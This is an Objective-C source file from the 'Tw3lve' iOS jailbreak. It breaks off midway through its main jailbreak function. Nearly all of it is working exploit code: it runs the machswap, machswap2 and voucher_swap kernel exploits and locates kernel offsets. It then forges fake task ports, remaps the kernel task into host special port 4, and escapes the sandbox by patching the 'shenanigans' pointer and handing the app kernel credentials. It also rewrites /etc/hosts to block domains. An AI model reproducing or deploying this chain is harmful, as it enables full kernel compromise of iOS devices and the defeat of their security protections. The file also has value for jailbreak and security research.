//
//  FirstViewController.m
//  newtw3lve
//
//  Created by Tanay Findley on 4/4/19.
//  Copyright © 2019 Tanay Findley. All rights reserved.
//

#import "Tw3lveViewController.h"
#import "snappy.h"

#include <mach/mach.h>
#include <sys/utsname.h>

#include <sys/sysctl.h>

#include "common.h"
#include "SettingsViewController.h"
#include "utils.h"
#include "KernelMemory.h"
#include "KernelUtils.h"
#include "machswap_offsets.h"
#include "machswap.h"
#include "machswap2.h"
#include "kerneldec.h"
#include "patchfinder64.h"
#include "KernelStructureOffsets.h"
#include "KernelExecution.h"
#include "MobileGestalt.h"
#include "kernel_memory.h"
#include "kernel_slide.h"

#include "FakeApt.h"
#include "Inject.h"

#include <sys/mount.h>
#include <sys/snapshot.h>

#include "voucher_swap.h"

#include "reboot.h"
#include "offsetcache.h"


#define ADDRSTRING(val)        [NSString stringWithFormat:@ADDR, val]

#define MAX_KASLR_SLIDE 0x21000000
#define KERNEL_SEARCH_ADDRESS 0xfffffff007004000


#define NOTICE(msg, wait, destructive) showAlert(@"TW3LVE", msg, wait, destructive)

@interface Tw3lveViewController ()

@property (strong, nonatomic) IBOutlet UITextView *uilog;


@end

@implementation Tw3lveViewController

Tw3lveViewController *sharedController = nil;

- (void)viewDidLoad {
    [super viewDidLoad];
    sharedController = self;
    
    

    
}


+ (Tw3lveViewController *)sharedController {
    return sharedController;
}

//LIFE
int waitForFile(const char *filename) {
    int rv = 0;
    rv = access(filename, F_OK);
    for (int i = 0; !(i >= 100 || rv == ERR_SUCCESS); i++) {
        usleep(100000);
        rv = access(filename, F_OK);
    }
    return rv;
}



uint64_t _vfs_context() {
    static uint64_t vfs_context = 0;
    if (vfs_context == 0) {
        vfs_context = kexecute(GETOFFSET(vfs_context_current), 1, 0, 0, 0, 0, 0, 0);
        vfs_context = zm_fix_addr(vfs_context);
    }
    return vfs_context;
}

int _vnode_lookup(const char *path, int flags, uint64_t *vpp, uint64_t vfs_context){
    size_t len = strlen(path) + 1;
    uint64_t vnode = kmem_alloc(sizeof(uint64_t));
    uint64_t ks = kmem_alloc(len);
    kwrite(ks, path, len);
    int ret = (int)kexecute(GETOFFSET(vnode_lookup), ks, 0, vnode, vfs_context, 0, 0, 0);
    if (ret != ERR_SUCCESS) {
        return -1;
    }
    *vpp = ReadKernel64(vnode);
    kmem_free(ks, len);
    kmem_free(vnode, sizeof(uint64_t));
    return 0;
}

uint64_t vnodeForPath(const char *path) {
    uint64_t vfs_context = 0;
    uint64_t *vpp = NULL;
    uint64_t vnode = 0;
    vfs_context = _vfs_context();
    if (!ISADDR(vfs_context)) {
        LOG("Failed to get vfs_context.");
        goto out;
    }
    vpp = malloc(sizeof(uint64_t));
    if (vpp == NULL) {
        LOG("Failed to allocate memory.");
        goto out;
    }
    if (_vnode_lookup(path, O_RDONLY, vpp, vfs_context) != ERR_SUCCESS) {
        LOG("Failed to get vnode at path \"%s\".", path);
        goto out;
    }
    vnode = *vpp;
    out:
    if (vpp != NULL) {
        free(vpp);
        vpp = NULL;
    }
    return vnode;
}

int _vnode_put(uint64_t vnode){
    return (int)kexecute(GETOFFSET(vnode_put), vnode, 0, 0, 0, 0, 0, 0);
}

uint64_t vnodeForSnapshot(int fd, char *name) {
    uint64_t rvpp_ptr = 0;
    uint64_t sdvpp_ptr = 0;
    uint64_t ndp_buf = 0;
    uint64_t vfs_context = 0;
    uint64_t sdvpp = 0;
    uint64_t sdvpp_v_mount = 0;
    uint64_t sdvpp_v_mount_mnt_data = 0;
    uint64_t snap_meta_ptr = 0;
    uint64_t old_name_ptr = 0;
    uint32_t ndp_old_name_len = 0;
    uint64_t ndp_old_name = 0;
    uint64_t snap_meta = 0;
    uint64_t snap_vnode = 0;
    rvpp_ptr = kmem_alloc(sizeof(uint64_t));
    LOG("rvpp_ptr = " ADDR, rvpp_ptr);
    if (!ISADDR(rvpp_ptr)) {
        goto out;
    }
    sdvpp_ptr = kmem_alloc(sizeof(uint64_t));
    LOG("sdvpp_ptr = " ADDR, sdvpp_ptr);
    if (!ISADDR(sdvpp_ptr)) {
        goto out;
    }
    ndp_buf = kmem_alloc(816);
    LOG("ndp_buf = " ADDR, ndp_buf);
    if (!ISADDR(ndp_buf)) {
        goto out;
    }
    vfs_context = _vfs_context();
    LOG("vfs_context = " ADDR, vfs_context);
    if (!ISADDR(vfs_context)) {
        goto out;
    }
    if (kexecute(GETOFFSET(vnode_get_snapshot), fd, rvpp_ptr, sdvpp_ptr, (uint64_t)name, ndp_buf, 2, vfs_context) != ERR_SUCCESS) {
        goto out;
    }
    sdvpp = ReadKernel64(sdvpp_ptr);
    LOG("sdvpp = " ADDR, sdvpp);
    if (!ISADDR(sdvpp)) {
        goto out;
    }
    sdvpp_v_mount = ReadKernel64(sdvpp + koffset(KSTRUCT_OFFSET_VNODE_V_MOUNT));
    LOG("sdvpp_v_mount = " ADDR, sdvpp_v_mount);
    if (!ISADDR(sdvpp_v_mount)) {
        goto out;
    }
    sdvpp_v_mount_mnt_data = ReadKernel64(sdvpp_v_mount + koffset(KSTRUCT_OFFSET_MOUNT_MNT_DATA));
    LOG("sdvpp_v_mount_mnt_data = " ADDR, sdvpp_v_mount_mnt_data);
    if (!ISADDR(sdvpp_v_mount_mnt_data)) {
        goto out;
    }
    snap_meta_ptr = kmem_alloc(sizeof(uint64_t));
    LOG("snap_meta_ptr = " ADDR, snap_meta_ptr);
    if (!ISADDR(snap_meta_ptr)) {
        goto out;
    }
    old_name_ptr = kmem_alloc(sizeof(uint64_t));
    LOG("old_name_ptr = " ADDR, old_name_ptr);
    if (!ISADDR(old_name_ptr)) {
        goto out;
    }
    ndp_old_name_len = ReadKernel32(ndp_buf + 336 + 48);
    LOG("ndp_old_name_len = 0x%x", ndp_old_name_len);
    ndp_old_name = ReadKernel64(ndp_buf + 336 + 40);
    LOG("ndp_old_name = " ADDR, ndp_old_name);
    if (!ISADDR(ndp_old_name)) {
        goto out;
    }
    if (kexecute(GETOFFSET(fs_lookup_snapshot_metadata_by_name_and_return_name), sdvpp_v_mount_mnt_data, ndp_old_name, ndp_old_name_len, snap_meta_ptr, old_name_ptr, 0, 0) != ERR_SUCCESS) {
        goto out;
    }
    snap_meta = ReadKernel64(snap_meta_ptr);
    LOG("snap_meta = " ADDR, snap_meta);
    if (!ISADDR(snap_meta)) {
        goto out;
    }
    snap_vnode = kexecute(GETOFFSET(apfs_jhash_getvnode), sdvpp_v_mount_mnt_data, ReadKernel32(sdvpp_v_mount_mnt_data + 440), ReadKernel64(snap_meta + 8), 1, 0, 0, 0);
    snap_vnode = zm_fix_addr(snap_vnode);
    LOG("snap_vnode = " ADDR, snap_vnode);
    if (!ISADDR(snap_vnode)) {
        goto out;
    }
    out:
    if (ISADDR(sdvpp)) {
        _vnode_put(sdvpp);
    }
    if (ISADDR(sdvpp_ptr)) {
        kmem_free(sdvpp_ptr, sizeof(uint64_t));
    }
    if (ISADDR(ndp_buf)) {
        kmem_free(ndp_buf, 816);
    }
    if (ISADDR(snap_meta_ptr)) {
        kmem_free(snap_meta_ptr, sizeof(uint64_t));
    }
    if (ISADDR(old_name_ptr)) {
        kmem_free(old_name_ptr, sizeof(uint64_t));
    }
    return snap_vnode;
}

uint32_t IO_BITS_ACTIVE = 0x80000000;
uint32_t IKOT_TASK = 2;
uint32_t IKOT_NONE = 0;

void convert_port_to_task_port(mach_port_t port, uint64_t space, uint64_t task_kaddr) {
    // now make the changes to the port object to make it a task port:
    uint64_t port_kaddr = get_address_of_port(getpid(), port);
    
    WriteKernel32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS), IO_BITS_ACTIVE | IKOT_TASK);
    WriteKernel32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_REFERENCES), 0xf00d);
    WriteKernel32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_SRIGHTS), 0xf00d);
    WriteKernel64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER), space);
    WriteKernel64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT),  task_kaddr);
    
    // swap our receive right for a send right:
    uint64_t task_port_addr = task_self_addr();
    uint64_t task_addr = ReadKernel64(task_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    uint64_t itk_space = ReadKernel64(task_addr + koffset(KSTRUCT_OFFSET_TASK_ITK_SPACE));
    uint64_t is_table = ReadKernel64(itk_space + koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));
    
    uint32_t port_index = port >> 8;
    const int sizeof_ipc_entry_t = 0x18;
    uint32_t bits = ReadKernel32(is_table + (port_index * sizeof_ipc_entry_t) + 8); // 8 = offset of ie_bits in struct ipc_entry
    
#define IE_BITS_SEND (1<<16)
#define IE_BITS_RECEIVE (1<<17)
    
    bits &= (~IE_BITS_RECEIVE);
    bits |= IE_BITS_SEND;
    
    WriteKernel32(is_table + (port_index * sizeof_ipc_entry_t) + 8, bits);
}


void make_port_fake_task_port(mach_port_t port, uint64_t task_kaddr) {
    convert_port_to_task_port(port, ipc_space_kernel(), task_kaddr);
}

uint64_t make_fake_task(uint64_t vm_map) {
    uint64_t fake_task_kaddr = kmem_alloc(0x1000);
    
    void* fake_task = malloc(0x1000);
    memset(fake_task, 0, 0x1000);
    *(uint32_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_REF_COUNT)) = 0xd00d; // leak references
    *(uint32_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_ACTIVE)) = 1;
    *(uint64_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_VM_MAP)) = vm_map;
    *(uint8_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_LCK_MTX_TYPE)) = 0x22;
    kmemcpy(fake_task_kaddr, (uint64_t) fake_task, 0x1000);
    free(fake_task);
    
    return fake_task_kaddr;
}

void set_all_image_info_addr(uint64_t kernel_task_kaddr) {
    struct task_dyld_info dyld_info = { 0 };
    mach_msg_type_number_t count = TASK_DYLD_INFO_COUNT;
    _assert(task_info(tfp0, TASK_DYLD_INFO, (task_info_t)&dyld_info, &count) == KERN_SUCCESS, @"Error task_info", true);
    LOG("Will save offsets to all_image_info_addr");
    SETOFFSET(kernel_task_offset_all_image_info_addr, koffset(KSTRUCT_OFFSET_TASK_ALL_IMAGE_INFO_ADDR));
    if (dyld_info.all_image_info_addr && dyld_info.all_image_info_addr != kernel_base && dyld_info.all_image_info_addr > kernel_base) {
        size_t blob_size = rk64(dyld_info.all_image_info_addr);
        struct cache_blob *blob = create_cache_blob(blob_size);
        _assert(rkbuffer(dyld_info.all_image_info_addr, blob, blob_size), @"Error set_all_image_info_addr", true);
        // Adds any entries that are in kernel but we don't have
        merge_cache_blob(blob);
        free(blob);
        
        // Free old offset cache - didn't bother comparing because it's faster to just replace it if it's the same
        kmem_free(dyld_info.all_image_info_addr, blob_size);
    }
    struct cache_blob *cache;
    size_t cache_size = export_cache_blob(&cache);
    _assert(cache_size > sizeof(struct cache_blob),  @"Error set_all_image_info_addr", true);
    LOG("Setting all_image_info_addr...");
    uint64_t kernel_cache_blob = kmem_alloc_wired(cache_size);
    blob_rebase(cache, (uint64_t)cache, kernel_cache_blob);
    wkbuffer(kernel_cache_blob, cache, cache_size);
    free(cache);
    WriteKernel64(kernel_task_kaddr + koffset(KSTRUCT_OFFSET_TASK_ALL_IMAGE_INFO_ADDR), kernel_cache_blob);
    _assert(task_info(tfp0, TASK_DYLD_INFO, (task_info_t)&dyld_info, &count) == KERN_SUCCESS,  @"Error set_all_image_info_addr", true);
    _assert(dyld_info.all_image_info_addr == kernel_cache_blob,  @"Error set_all_image_info_addr", true);
}

void set_all_image_info_size(uint64_t kernel_task_kaddr, uint64_t all_image_info_size) {
    struct task_dyld_info dyld_info = { 0 };
    mach_msg_type_number_t count = TASK_DYLD_INFO_COUNT;
    _assert(task_info(tfp0, TASK_DYLD_INFO, (task_info_t)&dyld_info, &count) == KERN_SUCCESS,  @"Error set_all_image_info_addr", true);
    LOG("Will set all_image_info_size to: " ADDR, all_image_info_size);
    if (dyld_info.all_image_info_size != all_image_info_size) {
        LOG("Setting all_image_info_size...");
        WriteKernel64(kernel_task_kaddr + koffset(KSTRUCT_OFFSET_TASK_ALL_IMAGE_INFO_SIZE), all_image_info_size);
        _assert(task_info(tfp0, TASK_DYLD_INFO, (task_info_t)&dyld_info, &count) == KERN_SUCCESS,  @"Error set_all_image_info_addr", true);
        _assert(dyld_info.all_image_info_size == all_image_info_size,  @"Error set_all_image_info_addr", true);
    } else {
        LOG("All_image_info_size already set.");
    }
}


kern_return_t mach_vm_remap(vm_map_t dst, mach_vm_address_t *dst_addr, mach_vm_size_t size, mach_vm_offset_t mask, int flags, vm_map_t src, mach_vm_address_t src_addr, boolean_t copy, vm_prot_t *cur_prot, vm_prot_t *max_prot, vm_inherit_t inherit);
void remap_tfp0_set_hsp4(mach_port_t *port) {
    // huge thanks to Siguza for hsp4 & v0rtex
    // for explainations and being a good rubber duck :p
    
    // see https://github.com/siguza/hsp4 for some background and explaination
    // tl;dr: there's a pointer comparison in convert_port_to_task_with_exec_token
    //   which makes it return TASK_NULL when kernel_task is passed
    //   "simple" vm_remap is enough to overcome this.
    
    // However, vm_remap has weird issues with submaps -- it either doesn't remap
    // or using remapped addresses leads to panics and kittens crying.
    
    // tasks fall into zalloc, so src_map is going to be zone_map
    // zone_map works perfectly fine as out zone -- you can
    // do remap with src/dst being same and get new address
    
    // however, using kernel_map makes more sense
    // we don't want zalloc to mess with our fake task
    // and neither
    
    // proper way to use vm_* APIs from userland is via mach_vm_*
    // but those accept task ports, so we're gonna set up
    // fake task, which has zone_map as its vm_map
    // then we'll build fake task port from that
    // and finally pass that port both as src and dst
    
    // last step -- wire new kernel task -- always a good idea to wire critical
    // kernel structures like tasks (or vtables :P )
    
    // and we can write our port to realhost.special[4]
    
    host_t host = mach_host_self();
    _assert(MACH_PORT_VALID(host),  @"Error remap_tfp0", true);
    uint64_t remapped_task_addr = 0;
    // task is smaller than this but it works so meh
    uint64_t sizeof_task = 0x1000;
    uint64_t kernel_task_kaddr = ReadKernel64(GETOFFSET(kernel_task));
    _assert(kernel_task_kaddr != 0, @"Error remap_tfp0", true);
    LOG("kernel_task_kaddr = " ADDR, kernel_task_kaddr);
    mach_port_t zm_fake_task_port = MACH_PORT_NULL;
    mach_port_t km_fake_task_port = MACH_PORT_NULL;
    kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &zm_fake_task_port);
    kr = kr || mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &km_fake_task_port);
    if (kr == KERN_SUCCESS && *port == MACH_PORT_NULL) {
        _assert(mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, port) == KERN_SUCCESS, @"Error remap_tfp0", true);
    }
    // strref \"Nothing being freed to the zone_map. start = end = %p\\n\"
    // or traditional \"zone_init: kmem_suballoc failed\"
    uint64_t zone_map_kptr = GETOFFSET(zone_map_ref);
    uint64_t zone_map = ReadKernel64(zone_map_kptr);
    // kernel_task->vm_map == kernel_map
    uint64_t kernel_map = ReadKernel64(kernel_task_kaddr + koffset(KSTRUCT_OFFSET_TASK_VM_MAP));
    uint64_t zm_fake_task_kptr = make_fake_task(zone_map);
    uint64_t km_fake_task_kptr = make_fake_task(kernel_map);
    make_port_fake_task_port(zm_fake_task_port, zm_fake_task_kptr);
    make_port_fake_task_port(km_fake_task_port, km_fake_task_kptr);
    km_fake_task_port = zm_fake_task_port;
    vm_prot_t cur = 0;
    vm_prot_t max = 0;
    _assert(mach_vm_remap(km_fake_task_port, &remapped_task_addr, sizeof_task, 0, VM_FLAGS_ANYWHERE | VM_FLAGS_RETURN_DATA_ADDR, zm_fake_task_port, kernel_task_kaddr, 0, &cur, &max, VM_INHERIT_NONE) == KERN_SUCCESS, @"Error remap_tfp0", true);
    _assert(kernel_task_kaddr != remapped_task_addr, @"Error remap_tfp0", true);
    LOG("remapped_task_addr = " ADDR, remapped_task_addr);
    _assert(mach_vm_wire(host, km_fake_task_port, remapped_task_addr, sizeof_task, VM_PROT_READ | VM_PROT_WRITE) == KERN_SUCCESS, @"Error remap_tfp0", true);
    uint64_t port_kaddr = get_address_of_port(getpid(), *port);
    LOG("port_kaddr = " ADDR, port_kaddr);
    make_port_fake_task_port(*port, remapped_task_addr);
    _assert(ReadKernel64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT)) == remapped_task_addr, @"Error remap_tfp0", true);
    // lck_mtx -- arm: 8  arm64: 16
    uint64_t host_priv_kaddr = get_address_of_port(getpid(), host);
    uint64_t realhost_kaddr = ReadKernel64(host_priv_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    WriteKernel64(realhost_kaddr + koffset(KSTRUCT_OFFSET_HOST_SPECIAL) + 4 * sizeof(void *), port_kaddr);
    set_all_image_info_addr(kernel_task_kaddr);
    set_all_image_info_size(kernel_task_kaddr, kernel_slide);
    mach_port_deallocate(mach_task_self(), host);
}

void blockDomainWithName(const char *name) {
    NSString *hostsFile = nil;
    NSString *newLine = nil;
    NSString *newHostsFile = nil;
    hostsFile = [NSString stringWithContentsOfFile:@"/etc/hosts" encoding:NSUTF8StringEncoding error:nil];
    newHostsFile = hostsFile;
    newLine = [NSString stringWithFormat:@"\n127.0.0.1 %s\n", name];
    if (![hostsFile containsString:newLine]) {
        newHostsFile = [newHostsFile stringByAppendingString:newLine];
    }
    newLine = [NSString stringWithFormat:@"\n::1 %s\n", name];
    if (![hostsFile containsString:newLine]) {
        newHostsFile = [newHostsFile stringByAppendingString:newLine];
    }
    if (![newHostsFile isEqual:hostsFile]) {
        [newHostsFile writeToFile:@"/etc/hosts" atomically:YES encoding:NSUTF8StringEncoding error:nil];
    }
}

void unblockDomainWithName(const char *name) {
    NSString *hostsFile = nil;
    NSString *newLine = nil;
    NSString *newHostsFile = nil;
    hostsFile = [NSString stringWithContentsOfFile:@"/etc/hosts" encoding:NSUTF8StringEncoding error:nil];
    newHostsFile = hostsFile;
    newLine = [NSString stringWithFormat:@"\n127.0.0.1 %s\n", name];
    if ([hostsFile containsString:newLine]) {
        newHostsFile = [hostsFile stringByReplacingOccurrencesOfString:newLine withString:@""];
    }
    newLine = [NSString stringWithFormat:@"\n0.0.0.0 %s\n", name];
    if ([hostsFile containsString:newLine]) {
        newHostsFile = [hostsFile stringByReplacingOccurrencesOfString:newLine withString:@""];
    }
    newLine = [NSString stringWithFormat:@"\n0.0.0.0    %s\n", name];
    if ([hostsFile containsString:newLine]) {
        newHostsFile = [hostsFile stringByReplacingOccurrencesOfString:newLine withString:@""];
    }
    newLine = [NSString stringWithFormat:@"\n::1 %s\n", name];
    if ([hostsFile containsString:newLine]) {
        newHostsFile = [hostsFile stringByReplacingOccurrencesOfString:newLine withString:@""];
    }
    if (![newHostsFile isEqual:hostsFile]) {
        [newHostsFile writeToFile:@"/etc/hosts" atomically:YES encoding:NSUTF8StringEncoding error:nil];
    }
}



typedef struct {
    int exploit;
    bool restoreFS;
    bool loadTweaksPlz;
    bool disableAppRevokesPlz;
    bool disableAutoUpdatesPlz;
} prefs_t;
bool load_prefs(prefs_t *prefs, NSDictionary *defaults) {
    if (prefs == NULL) {
        return false;
    }
    prefs->exploit = [defaults[EXPLOIT_TYPE] intValue];
    prefs->restoreFS = [defaults[RESTORE_FS] boolValue];
    prefs->loadTweaksPlz = [defaults[LOAD_TWEAKS] boolValue];
    prefs->disableAppRevokesPlz = [defaults[DAPP_REVOKES] boolValue];
    prefs->disableAutoUpdatesPlz = [defaults[DISABLE_AUPDATES] boolValue];
    return true;
}

bool A12 = false;
bool restore_rootfs_bool = false;
bool load_tweaks_bool = true;
bool disable_app_revokes = true;
bool disable_auto_updates = true;
NSString *prefsFile = nil;
int exploit = 0;

//0 = machswap
//1 = machswap2
//2 = voucher_swap

//MAGIC
void jailbreak()
{
    
    runOnMainQueueWithoutDeadlocking(^{
        Tw3lveViewController.sharedController.uilog.text = [Tw3lveViewController.sharedController.uilog.text stringByAppendingString:@"\n[Tw3lve] Running Jailbreak Thread..."];
        NSRange range = NSMakeRange(Tw3lveViewController.sharedController.uilog.text.length - 1, 1);
        [Tw3lveViewController.sharedController.uilog scrollRangeToVisible:range];
    });
    
    
    
    NSString *homeDirectory = NSHomeDirectory();
    pid_t myPid = getpid();
    uint64_t myProcAddr = 0;
    uint64_t myOriginalCredAddr = 0;
    uint64_t myCredAddr = 0;
    uint64_t kernelCredAddr = 0;
    uint64_t Shenanigans = 0;
    uid_t myUid = getuid();
    
    host_t myHost = HOST_NULL;
    host_t myOriginalHost = HOST_NULL;
    
    machswap_offsets_t *machswap_offsets = NULL;
    
    
    myHost = mach_host_self();
    _assert(MACH_PORT_VALID(myHost), @"Failed to set myhost", true);
    myOriginalHost = myHost;
    
    
    
    //EXPLOIT
    LOG(@"Exploiting Kernel Task...");
    runOnMainQueueWithoutDeadlocking(^{
        Tw3lveViewController.sharedController.uilog.text = [Tw3lveViewController.sharedController.uilog.text stringByAppendingString:@"\n[Tw3lve] Exploiting Kernel Task..."];
        NSRange range = NSMakeRange(Tw3lveViewController.sharedController.uilog.text.length - 1, 1);
        [Tw3lveViewController.sharedController.uilog scrollRangeToVisible:range];
    });

    
    if (exploit == 0)
    {
        LOG(@"Running Machswap Exploit...");
        
        runOnMainQueueWithoutDeadlocking(^{
            Tw3lveViewController.sharedController.uilog.text = [Tw3lveViewController.sharedController.uilog.text stringByAppendingString:@"\n[Tw3lve] Running Machswap..."];
            NSRange range = NSMakeRange(Tw3lveViewController.sharedController.uilog.text.length - 1, 1);
            [Tw3lveViewController.sharedController.uilog scrollRangeToVisible:range];
        });
        
        if ((machswap_offsets = get_machswap_offsets()) != NULL &&
            machswap_exploit(machswap_offsets, &tfp0, &kernel_base) == ERR_SUCCESS &&
            MACH_PORT_VALID(tfp0) &&
            ISADDR(kernel_base) &&
            (kernel_slide = (kernel_base - KERNEL_SEARCH_ADDRESS)) != -1) {
        }
    } if (exploit == 1)
    {
        LOG(@"Running Machswap2 Exploit...");
        
        runOnMainQueueWithoutDeadlocking(^{
            Tw3lveViewController.sharedController.uilog.text = [Tw3lveViewController.sharedController.uilog.text stringByAppendingString:@"\n[Tw3lve] Running Machswap2..."];
            NSRange range = NSMakeRange(Tw3lveViewController.sharedController.uilog.text.length - 1, 1);
            [Tw3lveViewController.sharedController.uilog scrollRangeToVisible:range];
        });
        
        if ((machswap_offsets = get_machswap_offsets()) != NULL &&
            machswap2_exploit(machswap_offsets, &tfp0, &kernel_base) == ERR_SUCCESS &&
            MACH_PORT_VALID(tfp0) &&
            ISADDR(kernel_base) &&
            (kernel_slide = (kernel_base - KERNEL_SEARCH_ADDRESS)) != -1) {
        }
    } else if (exploit == 2)
    {
        LOG(@"Running voucher_swap exploit...");
        
        runOnMainQueueWithoutDeadlocking(^{
            Tw3lveViewController.sharedController.uilog.text = [Tw3lveViewController.sharedController.uilog.text stringByAppendingString:@"\n[Tw3lve] Running voucher_swap..."];
            NSRange range = NSMakeRange(Tw3lveViewController.sharedController.uilog.text.length - 1, 1);
            [Tw3lveViewController.sharedController.uilog scrollRangeToVisible:range];
        });
        
        voucher_swap();
        prepare_for_rw_with_fake_tfp0(kernel_task_port);
        if (MACH_PORT_VALID(tfp0) &&
            kernel_slide_init() &&
            kernel_slide != -1 &&
            ISADDR(kernel_base = (kernel_slide + KERNEL_SEARCH_ADDRESS))) {
        }
    }
    
    
    //OFFSETS
    if (!found_offsets) {
        // Initialize patchfinder64.
        
        LOG("Initializing patchfinder64...");
        const char *original_kernel_cache_path = "/System/Library/Caches/com.apple.kernelcaches/kernelcache";
        const char *decompressed_kernel_cache_path = [homeDirectory stringByAppendingPathComponent:@"Documents/kernelcache.dec"].UTF8String;
        if (!canRead(decompressed_kernel_cache_path)) {
            FILE *original_kernel_cache = fopen(original_kernel_cache_path, "rb");
            _assert(original_kernel_cache != NULL, @"Failed to initialize patchfinder64.", true);
            FILE *decompressed_kernel_cache = fopen(decompressed_kernel_cache_path, "w+b");
            _assert(decompressed_kernel_cache != NULL, @"Failed to initialize patchfinder64.", true);
            _assert(decompress_kernel(original_kernel_cache, decompressed_kernel_cache, NULL, true) == ERR_SUCCESS, @"Failed to initialize patchfinder64.", true);
            fclose(decompressed_kernel_cache);
            fclose(original_kernel_cache);
        }
        struct utsname u = { 0 };
        _assert(uname(&u) == ERR_SUCCESS, @"Failed to initialize patchfinder64.", true);
        if (init_kernel(NULL, 0, decompressed_kernel_cache_path) != ERR_SUCCESS ||
            find_strref(u.version, 1, string_base_const, true, false) == 0) {
            _assert(clean_file(decompressed_kernel_cache_path), @"Failed to initialize patchfinder64.", true);
            _assert(false, @"Failed to initialize patchfinder64.", true);
        }
        LOG("Successfully initialized patchfinder64.");
    } else {
        auth_ptrs = GETOFFSET(auth_ptrs);
        monolithic_kernel = GETOFFSET(monolithic_kernel);
    }
    if (auth_ptrs) {
        SETOFFSET(auth_ptrs, true);
        LOG("Detected authentication pointers.");
        pmap_load_trust_cache = auth_ptrs ? _pmap_load_trust_cache : NULL;
        
        
        runOnMainQueueWithoutDeadlocking(^{
            Tw3lveViewController.sharedController.uilog.text = [Tw3lveViewController.sharedController.uilog.text stringByAppendingString:@"\n[Tw3lve] Detected an A12 Device!"];
            NSRange range = NSMakeRange(Tw3lveViewController.sharedController.uilog.text.length - 1, 1);
            [Tw3lveViewController.sharedController.uilog scrollRangeToVisible:range];
        });
        
        A12 = true;
        LOG(@"WE ARE AN A12 DEVICE");
    }
    if (monolithic_kernel) {
        SETOFFSET(monolithic_kernel, true);
        LOG("Detected monolithic kernel.");
    }
    
    
    
    if (!found_offsets) {
        
        
        runOnMainQueueWithoutDeadlocking(^{
            Tw3lveViewController.sharedController.uilog.text = [Tw3lveViewController.sharedController.uilog.text stringByAppendingString:@"\n[Tw3lve] Getting offsets..."];
            NSRange range = NSMakeRange(Tw3lveViewController.sharedController.uilog.text.length - 1, 1);
            [Tw3lveViewController.sharedController.uilog scrollRangeToVisible:range];
        });
        
        // Find offsets.
        
        LOG("Finding offsets...");
        SETOFFSET(kernel_base, kernel_base);
        SETOFFSET(kernel_slide, kernel_slide);
        
#define PF(x) do { \
SETOFFSET(x, find_symbol("_" #x)); \
if (!ISADDR(GETOFFSET(x))) SETOFFSET(x, find_ ##x()); \
LOG(#x " = " ADDR " + " ADDR, GETOFFSET(x), kernel_slide); \
_assert(ISADDR(GETOFFSET(x)), @"Failed to find " #x " offset.", true); \
SETOFFSET(x, GETOFFSET(x) + kernel_slide); \
} while (false)
        PF(trustcache);
        PF(OSBoolean_True);
        PF(osunserializexml);
        PF(smalloc);
        if (!auth_ptrs) {
            PF(add_x0_x0_0x40_ret);
        }
        PF(zone_map_ref);
        PF(vfs_context_current);
        PF(vnode_lookup);
        PF(vnode_put);
        PF(kernel_task);
        PF(shenanigans);
        PF(lck_mtx_lock);
        PF(lck_mtx_unlock);
        if (kCFCoreFoundationVersionNumber >= 1535.12) {
            PF(vnode_get_snapshot);
            PF(fs_lookup_snapshot_metadata_by_name_and_return_name);
            PF(apfs_jhash_getvnode);
        }
        if (auth_ptrs) {
            PF(pmap_load_trust_cache);
            PF(paciza_pointer__l2tp_domain_module_start);
            PF(paciza_pointer__l2tp_domain_module_stop);
            PF(l2tp_domain_inited);
            PF(sysctl__net_ppp_l2tp);
            PF(sysctl_unregister_oid);
            PF(mov_x0_x4__br_x5);
            PF(mov_x9_x0__br_x1);
            PF(mov_x10_x3__br_x6);
            PF(kernel_forge_pacia_gadget);
            PF(kernel_forge_pacda_gadget);
            PF(IOUserClient__vtable);
            PF(IORegistryEntry__getRegistryEntryID);
        }
#undef PF
        found_offsets = true;
        LOG("Successfully found offsets.");
        
        runOnMainQueueWithoutDeadlocking(^{
            Tw3lveViewController.sharedController.uilog.text = [Tw3lveViewController.sharedController.uilog.text stringByAppendingString:@"\n[Tw3lve] Found offsets!"];
            NSRange range = NSMakeRange(Tw3lveViewController.sharedController.uilog.text.length - 1, 1);
            [Tw3lveViewController.sharedController.uilog scrollRangeToVisible:range];
        });
        
    }
    
    
    // Deinitialize patchfinder64.
    term_kernel();
    
    
    // Escape Sandbox.
    LOG("Escaping Sandbox...");
    
    runOnMainQueueWithoutDeadlocking(^{
        Tw3lveViewController.sharedController.uilog.text = [Tw3lveViewController.sharedController.uilog.text stringByAppendingString:@"\n[Tw3lve] Escaping Sandbox..."];
        NSRange range = NSMakeRange(Tw3lveViewController.sharedController.uilog.text.length - 1, 1);
        [Tw3lveViewController.sharedController.uilog scrollRangeToVisible:range];
    });
    
    static uint64_t ShenanigansPatch = 0xca13feba37be;
    myProcAddr = get_proc_struct_for_pid(myPid);
    LOG("myProcAddr = " ADDR, myProcAddr);
    _assert(ISADDR(myProcAddr), @"Failed to escape sandbox.", true);
    kernelCredAddr = get_kernel_cred_addr();
    LOG("kernelCredAddr = " ADDR, kernelCredAddr);
    _assert(ISADDR(kernelCredAddr), @"Failed to escape sandbox.", true);
    Shenanigans = ReadKernel64(GETOFFSET(shenanigans));
    LOG("Shenanigans = " ADDR, Shenanigans);
    _assert(ISADDR(Shenanigans), @"Failed to escape sandbox.", true);
    if (Shenanigans != kernelCredAddr) {
        LOG("Detected corrupted shenanigans pointer.");
        Shenanigans = kernelCredAddr;
    }
    WriteKernel64(GETOFFSET(shenanigans), ShenanigansPatch);
    myOriginalCredAddr = myCredAddr = give_creds_to_process_at_addr(myProcAddr, kernelCredAddr);
    LOG("myOriginalCredAddr = " ADDR, myOriginalCredAddr);
